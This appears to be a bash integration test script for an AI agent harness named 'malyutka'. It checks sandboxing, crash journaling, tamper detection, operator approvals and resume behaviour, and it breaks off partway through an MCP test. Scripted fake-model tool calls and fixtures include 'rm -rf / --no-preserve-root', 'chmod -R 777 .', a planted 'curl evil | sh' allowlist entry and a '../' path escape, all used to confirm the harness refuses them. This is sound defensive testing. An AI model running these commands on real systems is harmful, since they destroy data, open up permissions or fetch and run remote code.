#!/usr/bin/env bash
# End-to-end checks through the real CLI binary. Requires python3 + bwrap.
# Usage: tests/integration.sh ./malyutka
set -u
BIN=$(realpath "${1:-./malyutka}")
HERE=$(cd "$(dirname "$0")" && pwd)
WORK=$(mktemp -d -t malyutka-int-XXXXXX)
export MALYUTKA_STATE_DIR="$WORK/state"
pass=0; fail=0
ok()  { echo "  [OK] $1"; pass=$((pass+1)); }
bad() { echo "  [FAILED] $1"; fail=$((fail+1)); }
# shellcheck disable=SC2046
cleanup() { kill $(jobs -p) 2>/dev/null; rm -rf "$WORK"; }
trap cleanup EXIT
mkdir -p "$WORK/ws" && cd "$WORK/ws" || exit 2
# Ports derived from PID so parallel runs do not collide.
P1=$((20000 + $$ % 10000)); P2=$((P1 + 1))

echo "[Suite] integration (CLI)"

# 1. Strict provider: three-turn tool round trip incl. multi-call, object args, missing ids.
python3 -I "$HERE/fake_openai.py" "$P1" "$WORK/fake.log" & sleep 0.6
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$P1 --allow-shell --json \
  'wire test' > "$WORK/trace.jsonl" 2> "$WORK/err.txt"
rc=$?
if [ $rc -eq 0 ] && ! grep -q '"error": "' "$WORK/fake.log"; then ok "strict provider round trip (exit $rc)"
else bad "strict provider round trip (exit $rc): $(cat "$WORK/fake.log" "$WORK/err.txt")"; fi
[ ! -e /etc/escape ] && ok "model's write to /etc did not land" || bad "/etc/escape exists"
ls "$MALYUTKA_STATE_DIR"/sessions/*.json >/dev/null 2>&1 && [ ! -d .malyutka ] \
  && ok "session saved in state dir, not in workspace" || bad "session location"

# 2. SIGKILL the harness while a sandboxed command runs.
python3 -I "$HERE/fake_oneshot.py" "$P2" 'sleep 3; touch late.txt' & sleep 0.6
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$P2 --allow-shell --json \
  'crash test' > /dev/null 2>&1 &
M=$!; sleep 1.5; kill -9 $M; wait $M 2>/dev/null; sleep 0.3
# Match the real sandbox processes (bwrap, or the inner `sleep 3`), not the
# fake server, whose own argv also contains the command string.
{ pgrep -f '^[^ ]*bwrap .*late\.txt' || pgrep -x -f 'sleep 3'; } >/dev/null && bad "sandbox survived harness SIGKILL" \
  || ok "sandbox died with the harness"
sleep 3
[ ! -e late.txt ] && ok "killed command left no late write" || bad "late.txt written after harness died"

# 3. The journal reports the interrupted action as UNKNOWN_OUTCOME.
out=$("$BIN" journal 2>&1); rc=$?
if [ $rc -eq 5 ] && grep -q "sleep 3; touch late.txt" <<<"$out"; then ok "journal reports UNKNOWN_OUTCOME (exit 5)"
else bad "journal after crash (exit $rc): $out"; fi

# 4. The next run surfaces it, without re-executing it.
"$BIN" run --json 'next run' > "$WORK/trace2.jsonl" 2>/dev/null
grep -q '"journal.unknown_outcome"' "$WORK/trace2.jsonl" && ok "next run surfaces the unknown outcome" \
  || bad "next run did not surface unknown outcome"
[ ! -e late.txt ] && ok "interrupted action was not re-executed" || bad "action re-executed"

# 5. Operator acknowledgement clears it.
id=$(grep -oE '9M14-[0-9a-f]+-[0-9]{4}' <<<"$out" | head -1)
"$BIN" journal --ack:"$id" >/dev/null 2>&1 && "$BIN" journal >/dev/null 2>&1 \
  && ok "ack clears the pending action" || bad "ack did not clear $id"

# 5b. Reconcile is distinct from ack: run another interrupted action, reconcile it.
python3 -I "$HERE/fake_oneshot.py" "$((P2 + 1))" 'sleep 3' & sleep 0.6
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P2 + 1)) --allow-shell --json \
  'crash 2' > /dev/null 2>&1 &
M=$!; sleep 1.2; kill -9 $M; wait $M 2>/dev/null
id2=$("$BIN" journal 2>&1 | grep ' UNKNOWN_OUTCOME ' | grep -oE '9M14-[0-9a-f]+-[0-9]{4}' | head -1)
"$BIN" journal --reconcile:"$id2" --as:not-executed >/dev/null 2>&1 && "$BIN" journal >/dev/null 2>&1 \
  && ok "reconcile records an established outcome" || bad "reconcile of $id2"

# 5c. State dir inside the workspace is refused (the agent could edit its own journal).
MALYUTKA_STATE_DIR="$PWD/.state" "$BIN" run --allow-shell 'x' >/dev/null 2>&1; rc=$?
[ $rc -eq 5 ] && [ ! -e "$PWD/.state/journal.jsonl" ] && ok "state dir inside workspace -> refused (exit 5)" \
  || bad "state dir inside workspace exit $rc"
ln -s "$PWD" "$WORK/ws-alias"
MALYUTKA_STATE_DIR="$WORK/ws-alias/st" "$BIN" run --allow-shell 'x' >/dev/null 2>&1; rc=$?
[ $rc -eq 5 ] && ok "state dir reaching the workspace via symlink -> refused (exit 5)" || bad "symlink state dir exit $rc"

# 5d. A tampered journal is CORRUPT: `journal` exits 6 and runs are refused.
cp "$MALYUTKA_STATE_DIR/journal.jsonl" "$WORK/journal.bak"
python3 -I - "$MALYUTKA_STATE_DIR/journal.jsonl" <<'PY'
import sys
p = sys.argv[1]; lines = open(p).read().split("\n")
i = next(k for k, l in enumerate(lines) if '"rec":"started"' in l)
lines[i] = lines[i].replace('"rec":"started"', '"rec":"startex"')
open(p, "w").write("\n".join(lines))
PY
"$BIN" journal >/dev/null 2>&1; rc1=$?
"$BIN" run 'x' >/dev/null 2>&1; rc2=$?
[ $rc1 -eq 6 ] && [ $rc2 -eq 5 ] && ok "tampered journal -> CORRUPT (6), runs refused (5)" \
  || bad "tampered journal: journal exit $rc1, run exit $rc2"
cp "$WORK/journal.bak" "$MALYUTKA_STATE_DIR/journal.jsonl"

# 5e. Liveness: an action whose run is still alive cannot be reconciled; after SIGKILL it can.
python3 -I "$HERE/fake_oneshot.py" "$((P2 + 2))" 'sleep 4' & sleep 0.6
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P2 + 2)) --allow-shell --json \
  'live' > /dev/null 2>&1 &
M=$!; sleep 1.3
out=$("$BIN" journal 2>&1)
id3=$(grep 'in progress' <<<"$out" | grep -oE '9M14-[0-9a-f]+-[0-9]{4}' | head -1)
"$BIN" journal --reconcile:"$id3" --as:completed >/dev/null 2>&1; rc_alive=$?
kill -9 $M; wait $M 2>/dev/null
# 6 operators race to reconcile the now-dead action: exactly one may win.
racers=()
for k in 1 2 3 4 5 6; do
  ( "$BIN" journal --reconcile:"$id3" --as:failed >/dev/null 2>&1; echo $? > "$WORK/race.$k" ) &
  racers+=($!)
done
wait "${racers[@]}"   # only the racers: the fake servers run until cleanup
wins=$(cat "$WORK"/race.* 2>/dev/null | grep -c '^0$')
if [ -n "$id3" ] && [ $rc_alive -eq 2 ] && [ "$wins" = 1 ]; then
  ok "live action not reconcilable; after SIGKILL exactly 1 of 6 racing reconciles wins"
else bad "liveness/race: id='$id3' rc_alive=$rc_alive wins=$wins"; fi
"$BIN" journal >/dev/null 2>&1; rc=$?
[ $rc -eq 0 ] && ok "journal healthy after the race (exit 0)" || bad "journal after race exit $rc"

# 6. Fail closed: no usable sandbox -> refuse to run.
PATH=/nonexistent "$BIN" run --allow-shell 'x' >/dev/null 2>&1; rc=$?
[ $rc -eq 3 ] && ok "no bwrap -> refuses to run (exit 3)" || bad "no bwrap exit $rc"

# 7. Workspace guard: refuse $HOME as workspace.
(cd "$HOME" && "$BIN" run --allow-shell 'x' >/dev/null 2>&1); rc=$?
[ $rc -eq 3 ] && ok "\$HOME as workspace -> refused (exit 3)" || bad "\$HOME workspace exit $rc"

# 8. Commitment latch through the real CLI and a real sandboxed shell.
P3=$((P2 + 3)); P4=$((P2 + 4))   # P1..P2+2 are taken above
mdir="$WORK/mstate"
python3 -I "$HERE/fake_oneshot.py" "$P3" 'touch latched.txt' & sleep 0.6
MALYUTKA_STATE_DIR="$mdir" "$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$P3 \
  --allow-shell --ask-from:B2 --mandates --json 'no mandate' > "$WORK/m1.jsonl" 2>/dev/null
if grep -q '"verdict":"DENY"' "$WORK/m1.jsonl" && [ ! -e latched.txt ]; then
  ok "ASK with no mandate -> denied, nothing ran"
else bad "ASK without mandate: $(grep policy.decision "$WORK/m1.jsonl")"; fi
mid=$(MALYUTKA_STATE_DIR="$mdir" "$BIN" mandate --grant --tools:shell --max-effect:B2 \
  --actions:1 --ttl:600 --goal:'integration' 2>/dev/null | awk '{print $1}')
python3 -I "$HERE/fake_oneshot.py" "$P4" 'touch latched.txt' & sleep 0.6
MALYUTKA_STATE_DIR="$mdir" "$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$P4 \
  --allow-shell --ask-from:B2 --mandates --json 'with mandate' > "$WORK/m2.jsonl" 2>/dev/null
if [ -n "$mid" ] && grep -q "\"policy\":\"mandate:$mid\"" "$WORK/m2.jsonl" && [ -e latched.txt ]; then
  ok "latched mandate -> sandboxed shell ran, decision names $mid"
else bad "mandate run: mid='$mid' $(grep policy.decision "$WORK/m2.jsonl")"; fi
out=$(MALYUTKA_STATE_DIR="$mdir" "$BIN" mandate 2>&1)
echo "$out" | grep -q "$mid  EXHAUSTED" && ok "budget of 1 used -> EXHAUSTED" || bad "mandate list: $out"
sed -i 's/integration/tampered/' "$mdir/mandates.jsonl"
MALYUTKA_STATE_DIR="$mdir" "$BIN" mandate >/dev/null 2>&1; rc=$?
MALYUTKA_STATE_DIR="$mdir" "$BIN" run --ask-from:B2 --mandates 'x' >/dev/null 2>&1; rc2=$?
[ $rc -eq 7 ] && [ $rc2 -eq 7 ] && ok "tampered mandate log -> CORRUPT (7), runs refused (7)" \
  || bad "tampered mandate log exits $rc/$rc2"

# 9. M2: file tools end to end (scripted model, real binary, real journal).
mkdir -p "$WORK/m2" && cd "$WORK/m2" || exit 2
P3=$((P2 + 10))
cat > "$WORK/files.json" <<'JSON'
[[{"name":"write_file","args":{"path":"src/hello.txt","content":"hello world\n"}}],
 [{"name":"patch","args":{"path":"src/hello.txt","old":"world","new":"malyutka"}}],
 [{"name":"read_file","args":{"path":"src/hello.txt"}},
  {"name":"read_file","args":{"path":"../escape.txt"}}]]
JSON
python3 -I "$HERE/fake_script.py" "$P3" "$WORK/files.json" & sleep 0.6
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$P3 --allow-files --json \
  'files' > "$WORK/files.trace" 2> "$WORK/files.err"; rc=$?
if [ $rc -eq 0 ] && [ "$(cat src/hello.txt)" = "hello malyutka" ]; then ok "file tools: write + patch landed in the workspace"
else bad "file tools (exit $rc): $(cat "$WORK/files.err")"; fi
grep -q 'ERROR: .*\.\.' "$WORK/files.err" || grep -q "'\.\.' is not allowed" "$WORK/files.err" \
  && ok "file tools: ../ escape reported to the model as an error" || bad "no traversal error: $(cat "$WORK/files.err")"
"$BIN" journal >/dev/null 2>&1 && ok "file tools: every call journaled, journal healthy" || bad "journal after file tools"

# 10. M2: approvals over the stdin control channel.
run_ask() { # name port script answer-or-"" extra-args... ; leaves trace in $WORK/$1.trace
  local name=$1 port=$2 script=$3 answer=$4; shift 4
  python3 -I "$HERE/fake_script.py" "$port" "$script" & sleep 0.5
  rm -f "$WORK/$name.fifo"; mkfifo "$WORK/$name.fifo"
  "$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$port --allow-shell --json \
    --approvals:stdin "$@" 'ask' < "$WORK/$name.fifo" > "$WORK/$name.trace" 2> "$WORK/$name.err" &
  local pid=$!
  exec 7> "$WORK/$name.fifo"
  if [ -n "$answer" ]; then
    local aid="" t=0
    while [ -z "$aid" ] && [ $t -lt 100 ]; do
      aid=$(grep -m1 '"approval.request"' "$WORK/$name.trace" 2>/dev/null | grep -oE '"action":"[^"]+"' | head -1 | cut -d'"' -f4)
      sleep 0.1; t=$((t+1))
    done
    echo "{\"action\":\"$aid\",\"answer\":\"$answer\"}" >&7
  fi
  wait $pid; RC=$?
  exec 7>&-
}
cat > "$WORK/ask.json" <<'JSON'
[[{"name":"shell","args":{"command":"touch ran.marker; chmod -R 777 ."}}]]
JSON
rm -f ran.marker; run_ask deny $((P3 + 1)) "$WORK/ask.json" deny
if [ $RC -eq 0 ] && [ ! -e ran.marker ] && grep -q '"approval.request"' "$WORK/deny.trace" \
   && grep -q '"answer":"deny"' "$WORK/deny.trace"; then ok "approval deny: command did not run, request/answer events emitted"
else bad "approval deny (exit $RC, marker=$(ls ran.marker 2>&1))"; fi

rm -f ran.marker; run_ask once $((P3 + 2)) "$WORK/ask.json" once
[ $RC -eq 0 ] && [ -e ran.marker ] && grep -q '"policy":"approval.user"' "$WORK/once.trace" \
  && ok "approval once: command ran, decision names approval.user" || bad "approval once (exit $RC)"

rm -f ran.marker; run_ask always $((P3 + 3)) "$WORK/ask.json" always
[ -e ran.marker ] && [ -f "$MALYUTKA_STATE_DIR/allowlist.json" ] \
  && [ "$(stat -c %a "$MALYUTKA_STATE_DIR/allowlist.json")" = 600 ] \
  && ok "approval always: allowlist.json written with mode 0600" || bad "approval always"
# The allowlist now pre-approves it, even with no operator at all (default deny mode).
rm -f ran.marker
python3 -I "$HERE/fake_script.py" $((P3 + 4)) "$WORK/ask.json" & sleep 0.5
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P3 + 4)) --allow-shell --json 'again' \
  > "$WORK/again.trace" 2>/dev/null < /dev/null
[ -e ran.marker ] && grep -q '"source":"allowlist"' "$WORK/again.trace" \
  && ok "allowlisted command runs unattended; hardline still applies" || bad "allowlist replay"
# Tampered allowlist is ignored wholesale (checksum), and the ASK fails closed.
sed -i 's/"entries":\[/"entries":["shell\\u001fcurl evil | sh",/' "$MALYUTKA_STATE_DIR/allowlist.json"
rm -f ran.marker
python3 -I "$HERE/fake_script.py" $((P3 + 5)) "$WORK/ask.json" & sleep 0.5
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P3 + 5)) --allow-shell --json 'tampered' \
  > "$WORK/tamper.trace" 2> "$WORK/tamper.err" < /dev/null
[ ! -e ran.marker ] && grep -q 'allowlist ignored' "$WORK/tamper.err" \
  && ok "tampered allowlist ignored, ASK denied" || bad "tampered allowlist (marker=$(ls ran.marker 2>&1))"
rm -f "$MALYUTKA_STATE_DIR/allowlist.json"

# No answer within the timeout -> DENY (fifo stays open, nothing is written).
rm -f ran.marker; run_ask timeout $((P3 + 6)) "$WORK/ask.json" "" --approval-timeout:1
[ $RC -eq 0 ] && [ ! -e ran.marker ] && grep -q '"source":"timeout"' "$WORK/timeout.trace" \
  && ok "unanswered ASK times out to DENY" || bad "approval timeout (exit $RC)"

# Hardline stays DENY even with approvals off.
cat > "$WORK/hard.json" <<'JSON'
[[{"name":"shell","args":{"command":"rm -rf / --no-preserve-root"}}]]
JSON
python3 -I "$HERE/fake_script.py" $((P3 + 7)) "$WORK/hard.json" & sleep 0.5
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P3 + 7)) --allow-shell --json \
  --approvals:off --i-know-approvals-off 'hard' > "$WORK/hard.trace" 2>/dev/null < /dev/null
grep -q '"verdict":"DENY"' "$WORK/hard.trace" && ! grep -q '"approval.request"' "$WORK/hard.trace" \
  && ok "hardline command denied even with --approvals:off" || bad "hardline with approvals off"
"$BIN" run --approvals:off 'x' >/dev/null 2>&1; rc=$?
[ $rc -eq 2 ] && ok "--approvals:off requires --i-know-approvals-off" || bad "approvals off ack (exit $rc)"

# 11. M4-lite: sessions and resume through the real CLI.
mkdir -p "$WORK/m4" && cd "$WORK/m4" || exit 2
P4=$((P3 + 20))
cat > "$WORK/s1.json" <<'JSON'
[[{"name":"write_file","args":{"path":"keep.txt","content":"PERSISTED-BY-RUN-1"}}]]
JSON
python3 -I "$HERE/fake_script.py" "$P4" "$WORK/s1.json" "$WORK/s1.req" & sleep 0.5
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$P4 --allow-files --json \
  'first turn' > "$WORK/s1.trace" 2>/dev/null
sid=$("$BIN" sessions --json | python3 -c 'import json,sys; print(json.load(sys.stdin)[0]["run"])')
[ -n "$sid" ] && grep -q '"session.saved"' "$WORK/s1.trace" \
  && ok "session checkpointed during the run (session.saved events), listed by 'sessions'" || bad "session list/checkpoint"
rm -f keep.txt
jbefore=$(grep -c '"rec"' "$MALYUTKA_STATE_DIR/journal.jsonl")
python3 -I "$HERE/fake_script.py" $((P4 + 1)) <(echo '[]') "$WORK/s2.req" & sleep 0.5
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P4 + 1)) --allow-files --json \
  --resume:"$sid" 'second turn' > "$WORK/s2.trace" 2> "$WORK/s2.err"; rc=$?
jafter=$(grep -c '"rec"' "$MALYUTKA_STATE_DIR/journal.jsonl")
if [ $rc -eq 0 ] && grep -q 'PERSISTED-BY-RUN-1\|wrote' "$WORK/s2.err" && grep -q 'first turn' "$WORK/s2.req"; then
  ok "resume: the model received the earlier transcript"
else bad "resume transcript (exit $rc): $(cat "$WORK/s2.err")"; fi
[ ! -e keep.txt ] && [ "$jbefore" = "$jafter" ] \
  && ok "resume re-executed nothing (file not recreated, journal unchanged)" || bad "resume replayed something (before=$jbefore after=$jafter)"
"$BIN" sessions --json | python3 -c 'import json,sys; d=json.load(sys.stdin); sys.exit(0 if d[0]["parent"]==sys.argv[1] else 1)' "$sid" \
  && ok "resumed session records its parent" || bad "parent link"
"$BIN" sessions --search:'first turn' | grep -q "$sid" && ok "sessions --search finds the transcript" || bad "sessions --search"
"$BIN" run --resume:does-not-exist x >/dev/null 2>&1; rc=$?
[ $rc -eq 2 ] && ok "resume of a missing session -> exit 2" || bad "missing resume exit $rc"

# Resume refuses while the session's lineage has an unresolved (crashed) action.
python3 -I "$HERE/fake_oneshot.py" "$((P4 + 2))" 'sleep 3' & sleep 0.5
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P4 + 2)) --allow-shell --json \
  'crash for resume' > /dev/null 2>&1 &
M=$!; sleep 1.3; kill -9 $M; wait $M 2>/dev/null; sleep 0.3
crashed=$("$BIN" journal 2>&1 | grep ' UNKNOWN_OUTCOME ' | grep -oE '9M14-[0-9a-f]+-[0-9]{4}' | tail -1)
crun=${crashed%-*}
"$BIN" run --provider:mock --resume:"$crun" 'continue' >/dev/null 2> "$WORK/s3.err"; rc=$?
[ $rc -eq 5 ] && grep -q 'unresolved' "$WORK/s3.err" && ok "resume refused while the lineage has an unresolved action (exit 5)" \
  || bad "resume with unknown outcome (exit $rc): $(cat "$WORK/s3.err")"
"$BIN" run --provider:mock --resume:"$crun" --resume-despite-unknown 'continue' >/dev/null 2>&1; rc=$?
[ $rc -eq 0 ] && ok "--resume-despite-unknown overrides, explicitly" || bad "override exit $rc"
"$BIN" journal --reconcile:"$crashed" --as:not-executed >/dev/null 2>&1 || true

# 12. Memory, SOUL.md, personality reach the system prompt; memory writes are private + journaled.
cat > "$WORK/mem.json" <<'JSON'
[[{"name":"memory","args":{"op":"add","text":"operator prefers tabs"}}]]
JSON
python3 -I "$HERE/fake_script.py" $((P4 + 3)) "$WORK/mem.json" "$WORK/m1.req" & sleep 0.5
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P4 + 3)) --allow-memory --json \
  'remember' > /dev/null 2>&1
mf="$MALYUTKA_STATE_DIR/memory.md"
[ -f "$mf" ] && [ "$(stat -c %a "$mf")" = 600 ] && grep -q 'operator prefers tabs' "$mf" \
  && ok "memory tool wrote memory.md (0600) in the state dir" || bad "memory file"
[ ! -e "$PWD/memory.md" ] && ok "memory is not in the workspace" || bad "memory.md in workspace"
printf 'You are a calm lighthouse keeper.' > "$MALYUTKA_STATE_DIR/SOUL.md"; chmod 600 "$MALYUTKA_STATE_DIR/SOUL.md"
python3 -I "$HERE/fake_script.py" $((P4 + 4)) <(echo '[]') "$WORK/m2.req" & sleep 0.5
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P4 + 4)) --allow-memory \
  --personality:terse-ops --json 'hello' > /dev/null 2>&1
python3 - "$WORK/m2.req" <<'PY' && ok "system prompt carries SOUL.md, personality and fenced memory" || bad "system prompt contents"
import json, sys
body = json.loads(open(sys.argv[1]).readline())
sys_msg = body["messages"][0]["content"]
assert body["messages"][0]["role"] == "system"
assert "lighthouse keeper" in sys_msg and "operations log voice" in sys_msg.lower()
assert "<memory>" in sys_msg and "operator prefers tabs" in sys_msg and "untrusted" in sys_msg
PY
"$BIN" run --provider:mock --personality:pirate x >/dev/null 2>&1; rc=$?
[ $rc -eq 2 ] && ok "unknown personality -> exit 2" || bad "personality exit $rc"
chmod 666 "$MALYUTKA_STATE_DIR/SOUL.md"
"$BIN" run --provider:mock x 2>&1 >/dev/null | grep -q 'SOUL ignored' && ok "group/world-writable SOUL.md is ignored with a warning" || bad "unsafe SOUL accepted"
rm -f "$MALYUTKA_STATE_DIR/SOUL.md"

# 13. Context compaction and ranked search through the real CLI.
mkdir -p "$WORK/m5" && cd "$WORK/m5" || exit 2
P5=$((P4 + 30))
export MALYUTKA_STATE_DIR="$WORK/m5state"
python3 -c 'import json; print(json.dumps([{"final": "first answer about zebra stripes " + "padding words " * 300}]))' > "$WORK/m5a.json"
python3 -I "$HERE/fake_script.py" "$P5" "$WORK/m5a.json" >/dev/null 2>&1 & sleep 0.5
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$P5 --json 'tell me about zebra stripes please' >/dev/null 2>&1
sid5=$("$BIN" sessions --json | python3 -c 'import json,sys; print(json.load(sys.stdin)[0]["run"])')
python3 -I "$HERE/fake_script.py" $((P5 + 1)) <(echo '[{"final":"SUMMARY: user asked about zebra stripes"},{"final":"after compaction"}]') "$WORK/m5.req" >/dev/null 2>&1 & sleep 0.5
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P5 + 1)) --json \
  --resume:"$sid5" --compress 'and now something else' > "$WORK/m5.trace" 2> "$WORK/m5.err"; rc=$?
newrun=$("$BIN" sessions --json | python3 -c 'import json,sys; print(json.load(sys.stdin)[0]["run"])')
arch="$MALYUTKA_STATE_DIR/sessions/$newrun.archive.jsonl"
if [ $rc -eq 0 ] && grep -q '"context.compacted"' "$WORK/m5.trace" && grep -q 'after compaction' "$WORK/m5.err"; then
  ok "--compress: history summarised, run answered with the compacted context"
else bad "compress run (exit $rc): $(cat "$WORK/m5.err")"; fi
[ -f "$arch" ] && [ "$(stat -c %a "$arch")" = 600 ] && grep -q 'zebra stripes' "$arch" \
  && ok "dropped messages archived first (0600, JSONL) in sessions/<run>.archive.jsonl" || bad "archive missing or wrong mode"
"$BIN" sessions --show:"$newrun" | grep -q 'compacted summary of earlier turns' \
  && ok "saved session carries the labelled summary, not the dropped turns" || bad "summary not in session"
python3 - "$WORK/m5.req" <<'PY' && ok "summariser got the fixed prompt; the real call saw the summary" || bad "request shapes"
import json, sys
reqs = [json.loads(l) for l in open(sys.argv[1])]
assert reqs[0]["messages"][0]["content"].startswith("You compress"), reqs[0]["messages"][0]
assert "tools" not in reqs[0], "summariser must not be offered tools"
assert any("compacted summary" in m["content"] for m in reqs[1]["messages"] if m["role"] == "user")
PY
"$BIN" sessions --search:'zebra stripes' | grep -q "$sid5" && "$BIN" sessions --search:'zebra' --json | python3 -c 'import json,sys; d=json.load(sys.stdin); sys.exit(0 if d and d[0]["score"]>0 else 1)' \
  && ok "ranked search (text and --json) finds the session" || bad "ranked search"
[ -f "$MALYUTKA_STATE_DIR/sessions/.index.json" ] && [ "$(stat -c %a "$MALYUTKA_STATE_DIR/sessions/.index.json")" = 600 ] \
  && ok "search index cache is 0600" || bad "search index mode"
"$BIN" run --provider:mock --compress 'x' >/dev/null 2>&1; rc=$?
[ $rc -eq 0 ] && ok "--compress with nothing to compact is harmless (reported, not fatal)" || bad "compress on fresh run exit $rc"
unset MALYUTKA_STATE_DIR
export MALYUTKA_STATE_DIR="$WORK/state"

# 14. Background processes and resource limits through the real CLI.
mkdir -p "$WORK/m6" && cd "$WORK/m6" || exit 2
P6=$((P5 + 30))
export MALYUTKA_STATE_DIR="$WORK/m6state"
tag_count() { # count processes whose command line contains $1 (read from /proc, never pgrep -f)
  python3 -I - "$1" <<'PY'
import os, sys
n = 0
for d in os.listdir("/proc"):
    if d.isdigit() and int(d) != os.getpid():     # never count ourselves: our argv holds the tag
        try:
            if sys.argv[1] in open(f"/proc/{d}/cmdline", "rb").read().replace(b"\0", b" ").decode(errors="replace"): n += 1
        except OSError:
            pass
print(n)
PY
}
TAG1="m6tag-$$-end"
python3 -c 'import json,sys; print(json.dumps([[{"name":"process","args":{"action":"start","command":"sleep 91; true # "+sys.argv[1]}}]]))' "$TAG1" > "$WORK/m6a.json"
python3 -I "$HERE/fake_script.py" "$P6" "$WORK/m6a.json" >/dev/null 2>&1 & sleep 0.5
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$P6 --allow-process --cgroups:off --json 'start one' \
  > "$WORK/m6a.trace" 2>/dev/null; rc=$?
sleep 1
if [ $rc -eq 0 ] && grep -q '"process.started"' "$WORK/m6a.trace" && grep -q '"process.reaped"' "$WORK/m6a.trace" \
   && [ "$(tag_count "$TAG1")" = 0 ]; then
  ok "process: a run that ends with a process running reaps it (event, no survivor)"
else bad "process reaping (exit $rc, survivors=$(tag_count "$TAG1")): $(grep process "$WORK/m6a.trace" | head -3)"; fi

TAG2="m6tag-$$-kill9"
python3 -c 'import json,sys; print(json.dumps([[{"name":"process","args":{"action":"start","command":"sleep 92; true # "+sys.argv[1]}}],[{"name":"shell","args":{"command":"sleep 20"}}]]))' "$TAG2" > "$WORK/m6b.json"
python3 -I "$HERE/fake_script.py" $((P6 + 1)) "$WORK/m6b.json" >/dev/null 2>&1 & sleep 0.5
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P6 + 1)) --allow-process --allow-shell --cgroups:off --json 'start, then idle' \
  > "$WORK/m6b.trace" 2>/dev/null &
M=$!
for _ in $(seq 1 50); do grep -q '"process.started"' "$WORK/m6b.trace" 2>/dev/null && break; sleep 0.1; done
sleep 1.2
before=$(tag_count "$TAG2")
kill -9 $M; wait $M 2>/dev/null; sleep 1.5
after=$(tag_count "$TAG2")
if [ "$before" -ge 1 ] && [ "$after" = 0 ]; then ok "process: SIGKILL of the harness takes the background process with it ($before -> $after)"
else bad "harness SIGKILL left processes: before=$before after=$after"; fi
"$BIN" journal >/dev/null 2>&1; [ $? -le 5 ] || bad "journal broken after kill -9 with a process"

# limits: functional probe, and a PATH without systemd-run to force "unavailable"
echo '[[{"name":"shell","args":{"command":"echo limited"}}]]' > "$WORK/m6c.json"
python3 -I "$HERE/fake_script.py" $((P6 + 2)) "$WORK/m6c.json" >/dev/null 2>&1 & sleep 0.5
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P6 + 2)) --allow-shell --json 'limits' > "$WORK/m6c.trace" 2>/dev/null
if grep -q '"confinement.limits"' "$WORK/m6c.trace" || grep -q '"confinement.degraded"' "$WORK/m6c.trace"; then
  ok "limits: --cgroups:auto reports either applied limits or a visible degradation ($(grep -o 'confinement\.[a-z]*' "$WORK/m6c.trace" | head -1))"
else bad "no limits event: $(cat "$WORK/m6c.trace" | head -3)"; fi
NOSD="$WORK/nosd-bin"; mkdir -p "$NOSD"; ln -sf "$(command -v bwrap)" "$NOSD/bwrap"; ln -sf "$(command -v python3)" "$NOSD/python3"
echo '[[{"name":"shell","args":{"command":"echo degraded-ok"}}]]' > "$WORK/m6d.json"
python3 -I "$HERE/fake_script.py" $((P6 + 3)) "$WORK/m6d.json" >/dev/null 2>&1 & sleep 0.5
PATH="$NOSD" "$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$((P6 + 3)) --allow-shell --cgroups:auto --json 'degrade' > "$WORK/m6d.trace" 2> "$WORK/m6d.err"; rc=$?
if [ $rc -eq 0 ] && grep -q '"confinement.degraded"' "$WORK/m6d.trace" && grep -q 'degraded-ok' "$WORK/m6d.err"; then
  ok "limits: no systemd-run + auto -> runs, visibly without limits"
else bad "auto degrade (exit $rc): $(cat "$WORK/m6d.err" | tail -2)"; fi
PATH="$NOSD" "$BIN" run --provider:mock --allow-shell --cgroups:require 'x' >/dev/null 2>&1; rc=$?
[ $rc -eq 3 ] && ok "limits: no systemd-run + --cgroups:require -> refused (exit 3)" || bad "cgroups require exit $rc"
PATH="$NOSD" "$BIN" run --provider:mock --allow-shell --cgroups:off --json 'x' 2>/dev/null | grep -q 'confinement.limits\|confinement.degraded' \
  && bad "--cgroups:off still reported limits" || ok "limits: --cgroups:off is silent"
"$BIN" doctor 2>/dev/null | grep -q '^limits: ' && ok "doctor reports the limits backend" || bad "doctor has no limits line"
unset MALYUTKA_STATE_DIR
export MALYUTKA_STATE_DIR="$WORK/state"

# 15. MCP servers and skills through the real CLI.
mkdir -p "$WORK/m7/ws" && cd "$WORK/m7/ws" || exit 2
P7=$((P6 + 40))
export MALYUTKA_STATE_DIR="$WORK/m7/state"; mkdir -p "$MALYUTKA_STATE_DIR"
cp "$HERE/fake_mcp.py" .
MCPTAG="m7tag-$$-mcp"
python3 -c 'import json,sys; print(json.dumps({"servers":[{"name":"s","command":["python3","fake_mcp.py","good",sys.argv[1]],"sandbox":True,"maxEffect":"B1","trust":"ask","timeoutSec":10,"envAllow":[]}]}))' "$MCPTAG" > "$MALYUTKA_STATE_DIR/mcp.json"
chmod 600 "$MALYUTKA_STATE_DIR/mcp.json"
echo '[[{"name":"mcp_s_echo","args":{"text":"via mcp"}}]]' > "$WORK/m7a.json"
python3 -I "$HERE/fake_script.py" "$P7" "$WORK/m7a.json" >/dev/null 2>&1 & sleep 0.5
"$BIN" run --provider:vllm --model:fake --base-url:http://127.0.0.1:$P7 --mcp --json 'mcp unasked' > "$WORK/m7a.trace" 2> "$WORK/m7a.err"
if grep -q '"mcp.connected"' "$WORK/m7a.trace" && grep -q 'asked by mcp.ask' "$WORK/m7a.err" && ! grep -q 'via mcp' "$WORK/m7a.err"; then
